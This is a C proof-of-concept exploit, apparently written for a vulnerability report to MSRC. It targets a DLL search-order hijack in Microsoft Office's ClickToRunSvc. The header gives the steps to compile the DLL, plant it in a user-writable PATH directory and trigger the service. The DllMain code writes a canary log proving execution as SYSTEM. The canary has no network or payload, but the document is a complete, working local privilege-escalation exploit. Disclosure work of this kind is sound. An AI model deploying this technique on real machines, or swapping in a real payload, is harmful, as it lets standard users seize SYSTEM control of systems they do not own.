/*
 * poc_osppc.c — Proof of Concept for CWE-427 in ClickToRunSvc
 *
 * VULNERABILITY: Microsoft Office ClickToRunSvc (OfficeClickToRun.exe)
 * delay-loads osppc.dll which does not exist on disk. Standard DLL
 * search order falls through to PATH, where a user-writable directory
 * allows a standard user to plant a DLL loaded as SYSTEM.
 *
 * COMPILE:  cl.exe poc_osppc.c /Fe:osppc.dll /LD /O1 /GS-
 * DEPLOY:   copy osppc.dll <user-writable-PATH-dir>\
 * TRIGGER:  schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"
 *           (or launch any Office application, or wait for daily auto-update)
 * VERIFY:   type C:\Windows\Temp\osppc_poc.log
 * CLEANUP:  del <PATH-dir>\osppc.dll & del C:\Windows\Temp\osppc_poc.log
 *
 * This PoC is CANARY ONLY. It writes a log file proving SYSTEM execution.
 * No payload. No network. No persistence. No credential access.
 *
 * Reported to MSRC by George Wu (gwu0738@gmail.com) — 2026-06-15
 */

#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

static void write_canary(void) {
    char buf[1024];
    char username[256] = {0};
    char modpath[MAX_PATH] = {0};
    DWORD ulen = sizeof(username);
    HANDLE tok = NULL;
    DWORD elev = 0;
    DWORD elen = sizeof(elev);
    SYSTEMTIME st;

    GetSystemTime(&st);
    GetUserNameA(username, &ulen);
    GetModuleFileNameA(NULL, modpath, MAX_PATH);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        GetTokenInformation(tok, TokenElevation, &elev, sizeof(elev), &elen);
        CloseHandle(tok);
    }

    snprintf(buf, sizeof(buf),
        "%04d-%02d-%02dT%02d:%02d:%02d|%s|elev=%lu|pid=%lu|OSPPC_POC|%s\n",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        username, elev, GetCurrentProcessId(), modpath);

    HANDLE hFile = CreateFileA(
        "C:\\Windows\\Temp\\osppc_poc.log",
        GENERIC_WRITE, FILE_SHARE_READ, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, buf, (DWORD)strlen(buf), &written, NULL);
        CloseHandle(hFile);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        write_canary();
    }
    return TRUE;
}
